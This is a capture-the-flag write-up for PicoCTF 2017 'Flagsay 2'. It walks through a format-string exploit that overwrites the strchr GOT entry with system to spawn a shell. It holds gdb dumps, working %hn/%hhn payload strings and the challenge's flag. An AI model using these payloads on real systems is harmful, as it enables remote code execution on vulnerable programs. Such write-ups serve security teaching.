# Flagsay 2

```
Apparently I messed up using system(). I'm pretty sure this one is secure though! I hope flagsay-2 is just as exhilarating as the the first one! Source. Connect on shell2017.picoctf.com:29932.
HINTS
The buffer isn't on the stack, so you can't use your own pointers. Is there another way to get a pointer?
Make sure you know about using hn and $ in format strings
```

This one is another format string attack. The vulnerability lies in the main function when the flag is printed.

```C
int main(int argc, char **argv){
        ...
        while(1){
                strncpy(tempFlag, flag, flagSize);
                tempFlag[flagSize-1] = '\x0';
                fgets(input, flagSize, stdin);
                char * temp = strchr(input, '\n');
                if(temp != NULL){
                        temp[0] = '\x0';
                }

                placeInFlag(tempFlag, input);
                printf(tempFlag);
        }
        ...
}
```

A user defined string should always be printed via ```%s```. We can use this to read and write arbitrary values to and from the stack. We will attempt a similar attack to the one we enacted in [Config Console](https://github.com/MeadeRobert/PicoCTF2017/tree/master/binary_exploitation/level3). This time, however, we will overwrite the GOT table entry for ```strchr``` with that of system so that our input can be used to call ```system("/bin/sh")```.

First we need to find the offset between strchr and system. We can do this using gdb.

```
$ gdb flagsay-2 -q
Reading symbols from flagsay-2...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/robbie/PicoCTF2017/binary_exploitation/level4/flagsay_2/flagsay-2
^C
Program received signal SIGINT, Interrupt.
0xf7fd9d70 in __kernel_vsyscall ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e5a3e0 <system>
(gdb) p strchr
$2 = {<text gnu-indirect-function variable, no debug info>} 0xf7e957f0 <strchr>
(gdb)
```

We can use a python command to do the math and print the resulting offset in hex.

```
$ python -c "print '{0:02x}'.format(0xf7e5a3e0 - 0xf7e957f0)"
-3b410
$
```

This can be used to calculate the address of ```system()``` from the leaked runtime address of ```strchr()```. We will leak this address using the ```%s``` format specifier. We have a problem, the string that is input by the user is stored in the heap. Therefore, we will have to use existing stack addresses to build a pointer to the GOT address of ```strchr()```. Let's dump the stack and see what we can use.

```
$ gdb flagsay-2 -q
Reading symbols from flagsay-2...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/robbie/PicoCTF2017/binary_exploitation/level4/flagsay_2/flagsay-2
^C
Program received signal SIGINT, Interrupt.
0xf7fd9d70 in __kernel_vsyscall ()
(gdb) x/200x $sp
0xffffd3a8:     0xf7e1b700      0x00000400      0xf7fd7000      0xf7ef7d03
0xffffd3b8:     0xf7fc5000      0xf7e8b163      0x00000000      0xf7fd7000
0xffffd3c8:     0x00000400      0xf7ffd938      0xf7fc5420      0xf7fc5000
0xffffd3d8:     0xf7eff859      0xf7fc5000      0xf7fc5c20      0x00000357
0xffffd3e8:     0xf7fc5c20      0xf7e8c039      0xf7fc5c20      0xffffd418
0xffffd3f8:     0xffffd410      0x080482b7      0xf7ffd938      0x00000000
0xffffd408:     0xf7fc5c20      0xf7e8be6b      0xf7fc5c20      0x00000000
0xffffd418:     0xf7e230c8      0xf7fc9000      0x00005d26      0xf7fc5000
0xffffd428:     0x00000000      0xf7e803da      0xf7fc5c20      0x00020ca1
0xffffd438:     0x00000360      0x00000000      0x00000000      0x00000fff
0xffffd448:     0x0804a008      0x0804a000      0x00000370      0xf7ffd000
0xffffd458:     0xf7ffd938      0xf7fc5000      0xf7fc5c20      0x0804a008
0xffffd468:     0x00000000      0xf7e80517      0xf7fc5c20      0x0804a008
0xffffd478:     0x00000357      0x0000000a      0x00000001      0x00000000
0xffffd488:     0xffffd4a4      0x08049974      0x08048288      0x080481e8
0xffffd498:     0x00000000      0xf7e7f371      0xf7fc5c20      0x0804a008
0xffffd4a8:     0x00000357      0x0000000a      0x00000001      0xf7fc5000
0xffffd4b8:     0x00000000      0xf7e1b700      0xffffd508      0xf7ff0470
0xffffd4c8:     0xf7fc5c20      0xf7fc5000      0x00000000      0x00000000
0xffffd4d8:     0xffffd508      0x0804867e      0x0804a008      0x00000358
0xffffd4e8:     0xf7fc5c20      0x08048722      0x00000001      0x0804a368
0xffffd4f8:     0x0804a008      0x00000358      0xf7fc53c4      0xffffd520
0xffffd508:     0x00000000      0xf7e35a63      0x080486d0      0x00000000
0xffffd518:     0x00000000      0xf7e35a63      0x00000001      0xffffd5b4
0xffffd528:     0xffffd5bc      0xf7feac3a      0x00000001      0xffffd5b4
0xffffd538:     0xffffd554      0x08049988      0x08048288      0xf7fc5000
0xffffd548:     0x00000000      0x00000000      0x00000000      0x846f5c8a
0xffffd558:     0xbd71589a      0x00000000      0x00000000      0x00000000
0xffffd568:     0x00000001      0x08048470      0x00000000      0xf7ff0470
0xffffd578:     0xf7e35979      0xf7ffd000      0x00000001      0x08048470
0xffffd588:     0x00000000      0x08048491      0x080485da      0x00000001
0xffffd598:     0xffffd5b4      0x080486d0      0x08048740      0xf7feb0f0
0xffffd5a8:     0xffffd5ac      0x0000001c      0x00000001      0xffffd6e1
0xffffd5b8:     0x00000000      0xffffd729      0xffffd73c      0xffffd74c
0xffffd5c8:     0xffffd757      0xffffd780      0xffffd7a2      0xffffd7b5
0xffffd5d8:     0xffffd7c1      0xffffdd5a      0xffffdd66      0xffffde08
0xffffd5e8:     0xffffde1e      0xffffde23      0xffffde65      0xffffde8a
0xffffd5f8:     0xffffde9b      0xffffdee1      0xffffdeea      0xffffdefc
0xffffd608:     0xffffdf04      0xffffdf13      0xffffdf46      0xffffdf6a
0xffffd618:     0xffffdf89      0x00000000      0x00000020      0xf7fd9d60
0xffffd628:     0x00000021      0xf7fd9000      0x00000010      0xbfebfbff
0xffffd638:     0x00000006      0x00001000      0x00000011      0x00000064
0xffffd648:     0x00000003      0x08048034      0x00000004      0x00000020
0xffffd658:     0x00000005      0x00000008      0x00000007      0xf7fdc000
0xffffd668:     0x00000008      0x00000000      0x00000009      0x08048470
0xffffd678:     0x0000000b      0x000003e8      0x0000000c      0x000003e8
0xffffd688:     0x0000000d      0x000003e8      0x0000000e      0x000003e8
0xffffd698:     0x00000017      0x00000000      0x00000019      0xffffd6cb
0xffffd6a8:     0x0000001f      0xffffdfb0      0x0000000f      0xffffd6db
0xffffd6b8:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb)
```

Let's also find out what value will be the first stack address when ```printf()``` is called.

```
(gdb) c
Continuing.
%x.%x.%x.%x.%x.%x.
               _
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             //804a01a.f7fc5c20.8048722.804a01a.804a368.804a008.                 /
            //                                   /
           //                                   /
          //                                   /
         //                                   /
        //                                   /
       //___________________________________/
      //
     //
    //
   //
  //
 //
```

This location of these addresses in the stack tell us that only the following stack values can be used for our exploit. The first listed is the 3$ value that can be referenced by format specifiers.

```
0xffffd4e8:                                                     0x0804a368
0xffffd4f8:     0x0804a008      0x00000358      0xf7fc53c4      0xffffd520
0xffffd508:     0x00000000      0xf7e35a63      0x080486d0      0x00000000
0xffffd518:     0x00000000      0xf7e35a63      0x00000001      0xffffd5b4
0xffffd528:     0xffffd5bc      0xf7feac3a      0x00000001      0xffffd5b4
0xffffd538:     0xffffd554      0x08049988      0x08048288      0xf7fc5000
0xffffd548:     0x00000000      0x00000000      0x00000000      0x846f5c8a
0xffffd558:     0xbd71589a      0x00000000      0x00000000      0x00000000
0xffffd568:     0x00000001      0x08048470      0x00000000      0xf7ff0470
0xffffd578:     0xf7e35979      0xf7ffd000      0x00000001      0x08048470
0xffffd588:     0x00000000      0x08048491      0x080485da      0x00000001
0xffffd598:     0xffffd5b4      0x080486d0      0x08048740      0xf7feb0f0
0xffffd5a8:     0xffffd5ac      0x0000001c      0x00000001      0xffffd6e1
0xffffd5b8:     0x00000000      0xffffd729      0xffffd73c      0xffffd74c
0xffffd5c8:     0xffffd757      0xffffd780      0xffffd7a2      0xffffd7b5
0xffffd5d8:     0xffffd7c1      0xffffdd5a      0xffffdd66      0xffffde08
0xffffd5e8:     0xffffde1e      0xffffde23      0xffffde65      0xffffde8a
0xffffd5f8:     0xffffde9b      0xffffdee1      0xffffdeea      0xffffdefc
0xffffd608:     0xffffdf04      0xffffdf13      0xffffdf46      0xffffdf6a
0xffffd618:     0xffffdf89      0x00000000      0x00000020      0xf7fd9d60
0xffffd628:     0x00000021      0xf7fd9000      0x00000010      0xbfebfbff
0xffffd638:     0x00000006      0x00001000      0x00000011      0x00000064
0xffffd648:     0x00000003      0x08048034      0x00000004      0x00000020
0xffffd658:     0x00000005      0x00000008      0x00000007      0xf7fdc000
0xffffd668:     0x00000008      0x00000000      0x00000009      0x08048470
0xffffd678:     0x0000000b      0x000003e8      0x0000000c      0x000003e8
0xffffd688:     0x0000000d      0x000003e8      0x0000000e      0x000003e8
0xffffd698:     0x00000017      0x00000000      0x00000019      0xffffd6cb
0xffffd6a8:     0x0000001f      0xffffdfb0      0x0000000f      0xffffd6db
0xffffd6b8:     0x00000000      0x00000000      0x00000000      0x00000000
```

We need to find a stack pointer that points to another stack pointer that points to another stack pointer in this region. We know, that's a mouth full, but we need a pointer to perform arbitrary writes to the stack to build a pointer to the GOT address of ```strchr()```. Another mouthfull, darn. Maybe it will make more sense as we go through the process.

We note that the pointer at stack index 17$ points to the address that can be referenced by 53$. We will use this fact to build our stack pointer at address 53$. The first 4 bytes are already what they should be to reference a stack position. Taking a hint, literally, we use the ```%hn``` specifier to write the last 2 bytes of an address on the stack that is located 36 bytes before 53$ at 44$. We write this value and then increment it several times to write the GOT address and the 4 addresses one byte above it to the stack starting at index 44$. To do this we need to get the value of that pointer and subtract 0x24. We can get this value using a format specifier ```%17$x``` to print out a the location of 53$. Then we can input it into a script which pushes the GOT address to the stack via format strings.

So we run the program. We leak the address of the stack pointer at 53$ with ```%17$x``` and run our script with that input value in another terminal, taking care to pipe the output to a file so that we can get the hex characters out of it.

Terminal 1:
```
$ nc shell2017.picoctf.com 29932 | tee out.txt
%17$x
_
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             //fffb4134                              /
            //                                   /
           //                                   /
          //                                   /
         //                                   /
        //                                   /
       //___________________________________/
      //
     //
    //
   //
  //
 //
```

Terminal 2:
```
$ python push_got.py 0xfffb4134
%16527x%17$hn
%143x%17$hhn
%255x%53$hhn
%144x%17$hhn
%24x%53$hhn
%145x%17$hhn
%131x%53$hhn
%146x%17$hhn
%135x%53$hhn
%147x%17$hhn
%256x%53$hhn
%148x%17$hhn
%24x%53$hhn
%149x%17$hhn
%131x%53$hhn
%150x%17$hhn
%135x%53$hhn
%151x%17$hhn
a%53$hhn
%152x%17$hhn
%24x%53$hhn
%153x%17$hhn
%131x%53$hhn
%154x%17$hhn
%135x%53$hhn
%155x%17$hhn
aa%53$hhn
%156x%17$hhn
%24x%53$hhn
%157x%17$hhn
%131x%53$hhn
%158x%17$hhn
%135x%53$hhn

$ 
```

Then we copy that text into the other terminal and then hit return a couple of times to make sure all of our instructions were executed by ```printf()```. Then we leak the value of the GOT entry for ```strchr()``` to calculate the address of ```system()```.


Terminal 1:
```
,%44$s,
               _
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             //,`li▒[h▒p▒a▒▒▒h▒,                            /
            //                                   /
           //                                   /
          //                                   /
         //                                   /
        //                                   /
       //___________________________________/
      //
     //
    //
   //
  //
 //

```

Those characters aren't readable so we cat the file we've been tee'ing to and pipe it to xxd and tee it to another file.

Terminal 2:

```
$ cat out.txt | xxd | tee hex.txt
...
000c7b0: 2020 2020 2020 2020 2020 2020 202f 2f2c               //,
000c7c0: 606c 69f7 905b 68f7 70b9 61f7 d0eb 68f7  `li..[h.p.a...h.
000c7d0: 2c20 2020 2020 2020 2020 2020 2020 2020  ,
...
```

The address is the first 4 bytes after the comma. It is 4 bytes because the binary is 32 bit, not 64 bit like Config Console. We then take this address and convert it to big endian to pass to another python script.

Address in little endian:
```
606c 69f7
```
Converted to big endian:
```
0xf7696c60
```
 
Next, we call our python script with this value in terminal 2 to generate the final format string.

Terminal 2:
```
$ python calc_system_fmt_str.py 0xf7696c60
%95x%44$hhn%35x%45$hhn                    %56x%46$hhn%147x%47$hhn

$
```

Copying this address into terminal 1 we have remapped the ```strchr()``` to ```system()```. Now we need only enter ```/bin/sh``` to execute a shell. Then, we simply cat the flag.

Terminal 1:
```
%95x%44$hhn%35x%45$hhn                    %56x%46$hhn%147x%47$hhn
               _
              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             //                                                                                        8f8e049                           f77abc20             /
            //                                                        8048722                                                                                                                                            8f8e049     /
           //                                   /
          //                                   /
         //                                   /
        //                                   /
       //___________________________________/
      //
     //
    //
   //
  //
 //
/bin/sh
ls
flagsay-2
flag.txt
xinetd_wrapper.sh
cat flag.txt
0729f4ba0e0152ca2786f59d1a18b517
```

More info on our python scripts can be found in the writeup for [Config Console](https://github.com/MeadeRobert/PicoCTF2017/tree/master/binary_exploitation/level3/config_console). Basically, they create format strings to write to several addresses 1 or 2 bytes off from each other and write 1 or 2 bytes at a time to each address to build the desired value. See also the links we provided at the bottom of the Config Console writeup for more info.
